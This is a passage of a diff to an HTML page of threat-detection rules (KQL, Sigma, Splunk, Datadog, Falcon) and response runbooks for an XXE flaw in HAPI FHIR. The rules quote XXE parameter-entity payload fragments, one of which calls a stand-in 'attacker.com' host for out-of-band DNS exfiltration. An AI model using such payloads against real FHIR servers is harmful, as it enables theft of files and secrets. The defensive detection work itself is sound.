+| NOT cidr(&quot;172.16.0.0/12&quot;, field=RemoteAddressIP4)
+| join({#event_simpleName=ProcessRollup2 CommandLine=/(hapi-fhir|org\.hl7\.fhir|ca\.uhn\.hapi|XsltUtilities)/i | groupBy([aid], function=count())}, field=aid)
+| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count(as=Connections))
+| Connections&lt;10</code></pre></div>
+    <div class="tab-content" id="art-07-uc2-spl"><span class="splunk-cat-pill splunk-cat-cloud" title="Splunk-research detection category">CLOUD</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=t count values(All_Traffic.dest_port) as dest_ports values(All_Traffic.transport) as transports min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.process_name IN (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;) OR All_Traffic.app IN (&quot;java&quot;,&quot;javaw&quot;)) All_Traffic.dest_category=&quot;external&quot; NOT (All_Traffic.dest=&quot;*.microsoft.com&quot; OR All_Traffic.dest=&quot;*.azure.com&quot; OR All_Traffic.dest=&quot;*.oracle.com&quot; OR All_Traffic.dest=&quot;*.github.com&quot; OR All_Traffic.dest=&quot;*.maven.org&quot; OR All_Traffic.dest=&quot;repo1.maven.org&quot; OR All_Traffic.dest=&quot;*.sonatype.com&quot; OR All_Traffic.dest=&quot;*.hl7.org&quot; OR All_Traffic.dest=&quot;tx.fhir.org&quot; OR All_Traffic.dest=&quot;terminology.hl7.org&quot; OR All_Traffic.dest=&quot;*.loinc.org&quot; OR All_Traffic.dest=&quot;*snomed.org&quot;) by All_Traffic.src All_Traffic.dest All_Traffic.process_name
+| `drop_dm_object_name(All_Traffic)`
+| convert ctime(firstTime) ctime(lastTime)
+| where count &lt; 5
+| sort - firstTime</code></pre><pre class="spl-mode-body" id="art-07-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count values(All_Traffic.dest_port) as dest_ports values(All_Traffic.transport) as transports min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.process_name IN (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;) OR All_Traffic.app IN (&quot;java&quot;,&quot;javaw&quot;)) All_Traffic.dest_category=&quot;external&quot; NOT (All_Traffic.dest=&quot;*.microsoft.com&quot; OR All_Traffic.dest=&quot;*.azure.com&quot; OR All_Traffic.dest=&quot;*.oracle.com&quot; OR All_Traffic.dest=&quot;*.github.com&quot; OR All_Traffic.dest=&quot;*.maven.org&quot; OR All_Traffic.dest=&quot;repo1.maven.org&quot; OR All_Traffic.dest=&quot;*.sonatype.com&quot; OR All_Traffic.dest=&quot;*.hl7.org&quot; OR All_Traffic.dest=&quot;tx.fhir.org&quot; OR All_Traffic.dest=&quot;terminology.hl7.org&quot; OR All_Traffic.dest=&quot;*.loinc.org&quot; OR All_Traffic.dest=&quot;*snomed.org&quot;) by All_Traffic.src All_Traffic.dest All_Traffic.process_name
+| `drop_dm_object_name(All_Traffic)`
+| convert ctime(firstTime) ctime(lastTime)
+| where count &lt; 5
+| sort - firstTime</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="8aefc12de4" data-platforms="cloudwatch,datadog,sent,spl" data-targets="">
+<details class="uc" data-uc-slug="4a33fad8a6" data-platforms="datadog,sent,sigma,spl" data-targets="vcs,web-app">
   <summary>
-    <span class="uc-title">XSLT/XML parser error burst on HAPI FHIR (saxonTransform XXE probing)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Reconnaissance</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="8aefc12de4" title="Copy share link to this UC" aria-label="Copy share link">
+    <span class="uc-title">XXE parameter-entity (`&lt;!ENTITY %`) payload in HTTP body to HAPI FHIR endpoint</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="4a33fad8a6" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Looks for a burst of XML/XSLT parsing errors from a single source against the HAPI FHIR app — DOCTYPE-rejected, entity-resolution-failed, TransformerException — characteristic of an attacker iterating XXE payloads against XsltUtilities.saxonTransform until one succeeds.
+    <div class="uc-desc">Hunts the parameter-entity DTD-fetch primitive (`&lt;!ENTITY % name SYSTEM &quot;http://...&quot;&gt;`) inside HTTP POST/PUT bodies hitting HAPI FHIR endpoints. Parameter entities are essentially never present in legitimate FHIR XML and are the highest-fidelity marker of blind XXE / OOB exfil — matching the advisory PoC&#x27;s A2 attack vector (`&lt;!ENTITY % oob SYSTEM &quot;http://127.0.0.1:&lt;oobPort&gt;/evil-fhir-xslt-ssrf.dtd&quot;&gt;`).
 
-Rationale: Article specifies XsltUtilities.saxonTransform throws TransformerException; PoC shows the call wrapped in try/catch and surfacing parser errors. Error tokens (TransformerException, net.sf.saxon, SAXParseException) and class name come directly from the advisory&#x27;s code excerpt and the PoC stack. Probing produces a burst of parser failures before the working payload — 5-in-5min is empirical (BluRaven baseline guidance applied).
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-2f55-g35j-5jmf
-  • https://www.saxonica.com/documentation/index.html#!sourcedocs/parsing</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Active Scanning: Vulnerability Scanning">T1595.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span> <span class="ind">Alerts.Alerts</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate FHIR client sending malformed XML (developer testing in pre-prod)</li><li>Bulk-import job feeding a non-FHIR XML by mistake</li><li>HAPI version upgrade causing transient compatibility errors</li><li>Touchstone/Inferno conformance tests deliberately sending edge-case XML</li><li>Internal vulnerability scanner (Tenable/Qualys) XXE plugin</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (ClientIP in ((_GetWatchlist(&#x27;InternalTestRanges&#x27;) | project IPAddress))) and not (Sample has_any (&quot;Touchstone&quot;,&quot;Inferno&quot;,&quot;connectathon&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 — Triage: Pull the actual XML payload that caused each error from the WAF/proxy/Tomcat access log for the bursting client IP; confirm DOCTYPE/ENTITY presence. Check whether HAPI utilities is &lt;= 6.9.8. Step 2 — Contain: WAF-block the source IP; deploy interim WAF rule rejecting any body matching &lt;!ENTITY|SYSTEM\s+[&quot;&#x27;](file|http|https|ftp|jar|netdoc): on FHIR paths; expedite library patch. Step 3 — Hunt: For each FHIR host the IP touched, run the file-disclosure + OOB-callback hunts (UCs above) over the same window; review any successful 200-response XSLT transform requests from the IP (those are the ones that worked); rotate secrets accessible to the Java service account.</div></details>
+Rationale: Parameter entity declarations (`&lt;!ENTITY % name SYSTEM &quot;...&quot;&gt;`) are how blind XXE forces an external DTD fetch — the advisory&#x27;s PoC literally emits `&lt;!ENTITY % oob SYSTEM &quot;http://127.0.0.1:&lt;oobPort&gt;/evil-fhir-xslt-ssrf.dtd&quot;&gt;` followed by `%oob;`. This pattern has essentially zero legitimate use in FHIR XML, so the FP floor is far lower than the generic DOCTYPE detection in UC2 — promoting tier to alerting at high confidence.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Application Layer Protocol: DNS">T1071.004</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Internal security team re-running the GHSA advisory&#x27;s PoC against a staging FHIR endpoint to validate the patch</li><li>Authorised bug-bounty researcher (identifiable by H1/Bugcrowd User-Agent or pre-declared source IP)</li><li>XML conformance scanner testing for XXE susceptibility as part of a CI security gate</li><li>Old SOAP-over-FHIR bridge (extremely rare) that embedded parameter entities for namespace handling</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where SourceIP !in (&quot;&lt;authorised_pentest_cidr&gt;&quot;) and RequestClientApplication !has_any (&quot;H1&quot;,&quot;Bugcrowd&quot;,&quot;Touchstone&quot;,&quot;AEGIS&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: extract the SYSTEM URL from the parameter-entity declaration (ParamEntity / EntityUrl) — if it resolves to a public attacker domain (passive DNS, no AS record before today, hosted on cheap registrar) treat as live exploitation; if it resolves to internal staging treat as authorised test. 2) Contain: block source IP at edge WAF, sinkhole the external DTD-fetch domain in DNS, and isolate the targeted FHIR host. Immediately invoke UC1 to confirm patch level — if 6.9.8 or below, expedite upgrade. 3) Hunt: pivot to UC3 (JVM outbound) and UC5 (JVM DNS) on the target DeviceName for the 60s window after this hit to confirm the callback succeeded; pull DeviceFileEvents for java.exe on the host for any sensitive file paths read in the same window.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-07-uc3-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-07-uc3-sigma">Sigma</button>
       <button class="tab-btn" data-target="art-07-uc3-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-07-uc3-cloudwatch">CloudWatch Logs Insights</button>
       <button class="tab-btn" data-target="art-07-uc3-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>let ErrorTokens = dynamic([&quot;TransformerException&quot;,&quot;TransformerConfigurationException&quot;,&quot;net.sf.saxon&quot;,&quot;XsltUtilities&quot;,&quot;DOCTYPE is disallowed&quot;,&quot;external entity&quot;,&quot;SAXParseException&quot;,&quot;unable to resolve external entity&quot;,&quot;ENTITY&quot;,&quot;saxonTransform&quot;]);
-Syslog
-| where TimeGenerated &gt; ago(7d)
-| where ProcessName has_any (&quot;tomcat&quot;,&quot;java&quot;,&quot;jboss&quot;,&quot;wildfly&quot;,&quot;catalina&quot;,&quot;hapi&quot;)
-| where SyslogMessage has_any (ErrorTokens)
-| extend ClientIP = extract(@&quot;(?i)(?:client|src|remoteAddr|clientIp)[=:\s]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&quot;, 1, SyslogMessage)
-| summarize ErrCount = count(), Hosts = dcount(Computer), Sample = any(SyslogMessage)
-          by bin(TimeGenerated, 5m), ClientIP
-| where ErrCount &gt;= 5     // 5+ XML-parser errors from one source in 5 min — empirical XXE-probing burst
+    <div class="tab-content active" id="art-07-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>CommonSecurityLog
+| where TimeGenerated &gt; ago(1d)
+| where RequestMethod in (&quot;POST&quot;,&quot;PUT&quot;)
+| where RequestURL has_any (&quot;/fhir/&quot;,&quot;/baseDstu&quot;,&quot;/baseR4&quot;,&quot;/baseR5&quot;,&quot;/hl7/fhir/&quot;)
+| where Message matches regex @&quot;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM\s+&quot;&quot;(?:https?|ftp|file)://&quot;
+    or Message has &quot;%oob;&quot;
+    or AdditionalExtensions matches regex @&quot;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM&quot;
+| extend ParamEntity = extract(@&quot;(?i)&lt;!ENTITY\s+%\s+(\w+)\s+SYSTEM\s+&quot;&quot;([^&quot;&quot;]+)&quot;&quot;&quot;, 0, Message)
+| extend EntityUrl = extract(@&quot;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM\s+&quot;&quot;([^&quot;&quot;]+)&quot;&quot;&quot;, 1, Message)
+| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, DestinationIP, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, ReceivedBytes, ParamEntity, EntityUrl, Message
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc3-datadog"><pre><button class="copy-btn">COPY</button><code>source:(tomcat OR java OR jboss OR wildfly) (@message:(*TransformerException* OR *TransformerConfigurationException* OR *net.sf.saxon* OR *XsltUtilities* OR *&quot;DOCTYPE is disallowed&quot;* OR *&quot;external entity&quot;* OR *SAXParseException* OR *&quot;unable to resolve external entity&quot;* OR *saxonTransform*) OR @error.message:(*Transformer* OR *SAXParse*))</code></pre></div>
-    <div class="tab-content" id="art-07-uc3-cloudwatch"><pre><button class="copy-btn">COPY</button><code># log group: /aws/elasticbeanstalk/&lt;env&gt;/var/log/tomcat OR /aws/ecs/&lt;fhir-task&gt;/stdout
-fields @timestamp, @logStream, @message
-| filter @message like /TransformerException/i
-      or @message like /TransformerConfigurationException/i
-      or @message like /net\.sf\.saxon/i
-      or @message like /XsltUtilities/i
-      or @message like /DOCTYPE is disallowed/i
-      or @message like /external entity/i
-      or @message like /SAXParseException/i
-      or @message like /saxonTransform/i
-| parse @message /(client|remoteAddr|clientIp)[=:\s]+(?&lt;client_ip&gt;\d+\.\d+\.\d+\.\d+)/
-| stats count() as err_count by bin(5m), client_ip
-| filter err_count &gt;= 5
-| sort @timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc3-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><pre><button class="copy-btn">COPY</button><code>search (index=tomcat OR index=fhir OR index=java_apps) (&quot;TransformerException&quot; OR &quot;TransformerConfigurationException&quot; OR &quot;net.sf.saxon&quot; OR &quot;XsltUtilities&quot; OR &quot;DOCTYPE is disallowed&quot; OR &quot;ENTITY&quot; OR &quot;external entity&quot; OR &quot;SAXParseException&quot; OR &quot;unable to resolve external entity&quot;) | rex field=_raw &quot;(?i)(?:client|src|remoteAddr|clientIp)[=:\s]+(?&lt;client_ip&gt;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})&quot; | bin _time span=5m | stats count as err_count dc(host) as hosts values(_raw) as samples by _time client_ip | where err_count &gt;= 5 | sort - _time</code></pre></div>
+    <div class="tab-content" id="art-07-uc3-sigma"><pre><button class="copy-btn">COPY</button><code>title: XXE Parameter-Entity OOB Payload Targeting HAPI FHIR (CVE-2026-55471)
+id: c9f5e6d4-af3a-6c7e-bd5e-4f8a0e3c7d1e
+description: Detects XXE parameter-entity declarations (&lt;!ENTITY % name SYSTEM &quot;http://...&quot;&gt;) inside HTTP POST/PUT bodies hitting HAPI FHIR endpoints. The advisory PoC&#x27;s A2 vector uses this exact primitive against XsltUtilities.saxonTransform to trigger blind XXE / SSRF / DNS callback.
+references:
+    - https://github.com/advisories/GHSA-2f55-g35j-5jmf
+author: SOC Detection Engineering
+date: 2026/06/18
+tags:
+    - attack.t1190
+    - attack.t1071.004
+    - attack.initial_access
+logsource:
+    category: proxy
+detection:
+    selection_url:
+        cs-uri-stem|contains:
+            - &#x27;/fhir/&#x27;
+            - &#x27;/baseDstu&#x27;
+            - &#x27;/baseR4&#x27;
+            - &#x27;/baseR5&#x27;
+            - &#x27;/hl7/fhir/&#x27;
+    selection_method:
+        cs-method:
+            - POST
+            - PUT
+    selection_param_entity:
+        cs-content|contains:
+            - &#x27;&lt;!ENTITY %&#x27;
+            - &#x27;%oob;&#x27;
+        cs-content|re:
+            - &#x27;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM\s+&quot;(?:https?|ftp|file)://&#x27;
+    condition: all of selection_*
+falsepositives:
+    - HAPI FHIR validator self-test using the advisory PoC against an isolated staging host
+    - Bug-bounty programmes whose researchers explicitly target the FHIR endpoint with declared scope
+level: critical</code></pre></div>
+    <div class="tab-content" id="art-07-uc3-datadog"><pre><button class="copy-btn">COPY</button><code>@http.method:(POST OR PUT) @http.url_details.path:(*/fhir/* OR */baseDstu* OR */baseR4/* OR */baseR5/* OR */hl7/fhir/*) (@http.request.body:(*\&lt;\!ENTITY\ %* OR *%oob\;*) OR @network.http.request_body:(*\&lt;\!ENTITY\ %*))</code></pre></div>
+    <div class="tab-content" id="art-07-uc3-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc3-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc3-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc3-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=t count from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) by Web.src Web.dest Web.url _time
+| `drop_dm_object_name(Web)`
+| join type=inner src dest [search index=waf OR index=proxy OR sourcetype IN (&quot;suricata&quot;,&quot;snort&quot;,&quot;zeek_http&quot;,&quot;waf:*&quot;) (&quot;&lt;!ENTITY %&quot; OR &quot;&lt;!ENTITY%&quot; OR &quot;%oob;&quot; OR &quot;&lt;!ENTITY  %&quot;) AND (&quot;SYSTEM&quot; AND (&quot;http://&quot; OR &quot;https://&quot; OR &quot;ftp://&quot; OR &quot;file://&quot;)) | rename src_ip as src dest_ip as dest body as request_body | fields src dest _time url request_body]
+| eval entity_match = if(match(request_body, &quot;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM\s+\&quot;(?:https?|ftp|file)&quot;), &quot;yes&quot;, &quot;no&quot;)
+| where entity_match=&quot;yes&quot;
+| table _time src dest url request_body</code></pre><pre class="spl-mode-body" id="art-07-uc3-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) by Web.src Web.dest Web.url _time
+| `drop_dm_object_name(Web)`
+| join type=inner src dest [search index=waf OR index=proxy OR sourcetype IN (&quot;suricata&quot;,&quot;snort&quot;,&quot;zeek_http&quot;,&quot;waf:*&quot;) (&quot;&lt;!ENTITY %&quot; OR &quot;&lt;!ENTITY%&quot; OR &quot;%oob;&quot; OR &quot;&lt;!ENTITY  %&quot;) AND (&quot;SYSTEM&quot; AND (&quot;http://&quot; OR &quot;https://&quot; OR &quot;ftp://&quot; OR &quot;file://&quot;)) | rename src_ip as src dest_ip as dest body as request_body | fields src dest _time url request_body]
+| eval entity_match = if(match(request_body, &quot;(?i)&lt;!ENTITY\s+%\s+\w+\s+SYSTEM\s+\&quot;(?:https?|ftp|file)&quot;), &quot;yes&quot;, &quot;no&quot;)
+| where entity_match=&quot;yes&quot;
+| table _time src dest url request_body</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="71cc31cf5b" data-platforms="datadog,def,falcon,sent,spl" data-targets="windows">
+  <summary>
+    <span class="uc-title">JVM DNS lookup for fresh external domain within 10s of inbound FHIR POST</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="71cc31cf5b" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Time-correlates an inbound HTTP POST/PUT to a HAPI FHIR endpoint with the JVM&#x27;s subsequent DNS query for an external domain that&#x27;s never been seen across the org in the prior 30 days. Catches the OOB DNS exfiltration variant of the XXE where the attacker uses `&lt;!ENTITY % p SYSTEM &quot;http://&lt;canary&gt;.attacker.com/&quot;&gt;` and reads the canary out of the DNS log — even when the outbound HTTP is firewall-blocked, the DNS lookup still leaks.
+
+Rationale: Maps the advisory PoC&#x27;s `&lt;!ENTITY % oob SYSTEM &quot;http://127.0.0.1:&lt;oobPort&gt;/...&quot;&gt;` callback to its lowest-bar observable: a DNS lookup. Time-correlating against the inbound FHIR POST (within 10s) and excluding domains seen in the org over the prior 30d catches the OOB DNS exfil variant that&#x27;s used when outbound HTTP is firewalled but DNS isn&#x27;t — which is the textbook XXE-DNS-only exfil pattern. 30d baseline anti-join excludes legit terminology server cache misses.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Application Layer Protocol: DNS">T1071.004</span> <span class="ind tech" title="Exfiltration Over C2 Channel">T1041</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span> <span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>First-time pull of a new ValueSet / CodeSystem from a partner terminology server that&#x27;s never been queried before</li><li>HAPI FHIR boot-time license/registration call-home to a vendor SaaS</li><li>JVM telemetry agent (Datadog APM, New Relic) first phoning home post-deployment</li><li>Org adopting a new FHIR IG that references a fresh tx server</li><li>Patch-Tuesday Java auto-update reaching java.net or similar</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where Domain !endswith &quot;.datadoghq.com&quot; and Domain !endswith &quot;.newrelic.com&quot; and Domain !endswith &quot;.appdynamics.com&quot; and Domain !endswith &quot;.elastic-cloud.com&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull the inbound FHIR POST body from W3CIISLog/CommonSecurityLog at PostTime and check for `&lt;!DOCTYPE`/`&lt;!ENTITY` markers — if present, this is a confirmed OOB exfil. Resolve the freshly-queried Domain via passive DNS for registration age and AS context; &lt;30d-old + cheap registrar = high confidence. 2) Contain: sinkhole the domain in internal DNS, block the source ClientIP at the FHIR ingress, and snapshot the JVM (memory + heap dump) for forensics before patching. 3) Hunt: pivot to UC3 (JVM outbound HTTP) for the same DvcHostname over a wider 5-minute window to surface the actual data-bearing callback that follows the DNS leak; pull DeviceFileEvents for java.exe on the host to check whether any sensitive files (passwords, application.properties, /etc/passwd, /etc/shadow, *.pem) were referenced.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-07-uc4-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-07-uc4-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-07-uc4-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-07-uc4-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-07-uc4-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-07-uc4-kql"><pre><button class="copy-btn">COPY</button><code>let WindowSec = 10s;
+let FhirPosts = DeviceNetworkEvents
+    | where Timestamp &gt; ago(1d)
+    | where ActionType in (&quot;InboundConnectionAccepted&quot;,&quot;ConnectionAccepted&quot;)
+    | where LocalPort in (8080, 8443, 80, 443, 9090)
+    | join kind=inner (DeviceProcessEvents | where Timestamp &gt; ago(1d) | where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;) | where InitiatingProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;) | distinct DeviceId) on DeviceId
+    | project PostTime = Timestamp, DeviceId, DeviceName, ClientIP = RemoteIP;
+let DnsBaseline = DeviceNetworkEvents
+    | where Timestamp between (ago(30d) .. ago(1d))
+    | where isnotempty(RemoteUrl)
+    | summarize by Domain = tolower(RemoteUrl);
+let JvmDns = DeviceNetworkEvents
+    | where Timestamp &gt; ago(1d)
+    | where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;)
+    | where isnotempty(RemoteUrl)
+    | where RemoteIPType == &quot;Public&quot;
+    | extend Domain = tolower(RemoteUrl)
+    | where not(Domain endswith &quot;.hl7.org&quot; or Domain endswith &quot;.loinc.org&quot; or Domain endswith &quot;snomed.org&quot; or Domain endswith &quot;.microsoft.com&quot; or Domain endswith &quot;.azure.com&quot; or Domain endswith &quot;.maven.org&quot;)
+    | join kind=leftanti DnsBaseline on Domain;
+FhirPosts
+| join kind=inner JvmDns on DeviceId
+| where Timestamp between (PostTime .. PostTime + WindowSec)
+| project PostTime, DnsTime = Timestamp, DeltaSec = datetime_diff(&#x27;second&#x27;, Timestamp, PostTime), DeviceName, ClientIP, JvmProcess = InitiatingProcessFileName, JvmCmdLine = InitiatingProcessCommandLine, Domain, RemoteIP
+| order by PostTime desc</code></pre></div>
+    <div class="tab-content" id="art-07-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>let WindowSec = 10s;
+let HapiHosts = ImProcessCreate
+    | where TimeGenerated &gt; ago(7d)
+    | where ActingProcessName has_any (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;) or TargetProcessName has_any (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;)
+    | where ActingProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;)
+         or TargetProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;)
+    | distinct DvcHostname;
+let FhirPosts = (union isfuzzy=true
+    (W3CIISLog | where TimeGenerated &gt; ago(1d) | where csMethod in (&quot;POST&quot;,&quot;PUT&quot;) | where csUriStem has_any (&quot;/fhir/&quot;,&quot;/baseDstu&quot;,&quot;/baseR4&quot;,&quot;/baseR5&quot;,&quot;/hl7/fhir/&quot;) | project PostTime = TimeGenerated, DvcHostname = Computer, ClientIP = cIP, UriStem = csUriStem),
+    (CommonSecurityLog | where TimeGenerated &gt; ago(1d) | where RequestMethod in (&quot;POST&quot;,&quot;PUT&quot;) | where RequestURL has_any (&quot;/fhir/&quot;,&quot;/baseDstu&quot;,&quot;/baseR4&quot;,&quot;/baseR5&quot;,&quot;/hl7/fhir/&quot;) | project PostTime = TimeGenerated, DvcHostname = DestinationHostName, ClientIP = SourceIP, UriStem = RequestURL))
+    | where DvcHostname in (HapiHosts);
+let DnsBaseline = ImDnsActivity | where TimeGenerated between (ago(30d) .. ago(1d)) | summarize by Domain = tolower(DnsQuery);
+ImDnsActivity
+| where TimeGenerated &gt; ago(1d)
+| where DvcHostname in (HapiHosts)
+| where SrcUsername has_any (&quot;java&quot;,&quot;javaw&quot;) or DnsQuery != &quot;&quot;
+| extend Domain = tolower(DnsQuery)
+| where not(Domain endswith &quot;.hl7.org&quot; or Domain endswith &quot;.loinc.org&quot; or Domain endswith &quot;snomed.org&quot; or Domain endswith &quot;.microsoft.com&quot; or Domain endswith &quot;.azure.com&quot; or Domain endswith &quot;.maven.org&quot; or Domain endswith &quot;.local&quot;)
+| join kind=leftanti DnsBaseline on Domain
+| join kind=inner FhirPosts on DvcHostname
+| where TimeGenerated between (PostTime .. PostTime + WindowSec)
+| project PostTime, DnsTime = TimeGenerated, DeltaSec = datetime_diff(&#x27;second&#x27;, TimeGenerated, PostTime), DvcHostname, ClientIP, UriStem, Domain, DstIpAddr
+| order by PostTime desc</code></pre></div>
+    <div class="tab-content" id="art-07-uc4-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:22 (@Image:(*\\java.exe OR *\\javaw.exe OR *\\Java.exe) OR @process.name:(java OR javaw)) -@QueryName:(*.hl7.org OR *.loinc.org OR *snomed.org OR *.microsoft.com OR *.azure.com OR *.maven.org OR *.local OR *.internal)</code></pre></div>
+    <div class="tab-content" id="art-07-uc4-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=DnsRequest
+| ContextImageFileName=/\\(java|javaw)\.exe$/i OR ContextImageFileName=/\/bin\/java$/i
